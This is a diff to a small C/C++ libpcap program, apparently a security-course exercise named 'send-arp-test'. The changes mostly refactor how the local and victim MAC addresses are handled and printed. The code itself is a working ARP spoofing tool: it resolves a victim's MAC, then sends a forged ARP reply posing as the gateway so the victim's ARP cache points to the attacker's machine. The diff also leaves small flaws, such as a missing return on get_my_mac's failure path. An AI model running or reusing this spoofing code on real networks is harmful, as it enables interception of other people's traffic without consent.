@@ -32,8 +32,8 @@ void usage() {
     printf("sample: send-arp-test wlan0 X.X.X.X X.X.X.X\n");
 }
 
-
-Mac get_my_mac(char* eth_interface){
+const char* get_my_mac(char* eth_interface){
+    char* addr = (char*)malloc(MAC_LEN * 3);
     struct ifreq s;
     int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
 
@@ -41,8 +41,14 @@ Mac get_my_mac(char* eth_interface){
     if (0 == ioctl(fd, SIOCGIFHWADDR, &s)) {
         int i;
         int size;
-
-        return Mac(s.ifr_addr.sa_data);
+        size = sprintf(addr, "%02x:", (unsigned char)s.ifr_addr.sa_data[0]);
+        for (i = 1; i < MAC_LEN; ++i){
+            if (i != MAC_LEN - 1)
+                size += sprintf(addr+size, "%02x:", (unsigned char)s.ifr_addr.sa_data[i]);
+            else
+                size += sprintf(addr+size, "%02x\0", (unsigned char)s.ifr_addr.sa_data[i]);
+        }
+        return addr;
     }
 }
 
@@ -110,7 +116,7 @@ int main(int argc, char* argv[]) {
         return -1;
     }
 
-    Mac my_mac = get_my_mac(dev);
+    const char* my_mac = get_my_mac(dev);
     const char init_eth_dmac[18] = "ff:ff:ff:ff:ff:ff";
     const char init_arp_tmac[18] = "00:00:00:00:00:00";
 
@@ -123,15 +129,17 @@ int main(int argc, char* argv[]) {
 //        printf("s_ip: %s, v_ip: %s\n", sender_ip, target_ip);
 
         // like gateway
-        arp_packet(&packet, my_mac, Mac(init_eth_dmac), Mac(init_arp_tmac), ArpHdr::Request, Ip(target_ip), Ip(sender_ip));
+        arp_packet(&packet, Mac(my_mac), Mac(init_eth_dmac), Mac(init_arp_tmac), ArpHdr::Request, Ip(target_ip), Ip(sender_ip));
 
 
         Mac victim_mac = resolve_mac(handle, &packet, Ip(sender_ip));
-        printf("victim mac: %s\n", victim_mac.getMac());
+        char tmp[20];
+        sprintf(tmp, "%02X:%02X:%02X:%02X:%02X:%02X\n", victim_mac.getMac()[0], victim_mac.getMac()[1], victim_mac.getMac()[2], victim_mac.getMac()[3], victim_mac.getMac()[4], victim_mac.getMac()[5]);
+        printf("victim_mac: %s\n", tmp);
 
 
         // like gateway
-        arp_packet(&packet, my_mac, victim_mac, victim_mac, ArpHdr::Reply, Ip(target_ip), Ip(sender_ip));
+        arp_packet(&packet, Mac(my_mac), victim_mac, victim_mac, ArpHdr::Reply, Ip(target_ip), Ip(sender_ip));
         int last_res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
         if (last_res != 0) {
             fprintf(stderr, "pcap_sendpacket return %d error=%s\n", last_res, pcap_geterr(handle));
@@ -139,4 +147,5 @@ int main(int argc, char* argv[]) {
 
         pcap_close(handle);
     }
+    free((void*) my_mac);
 }
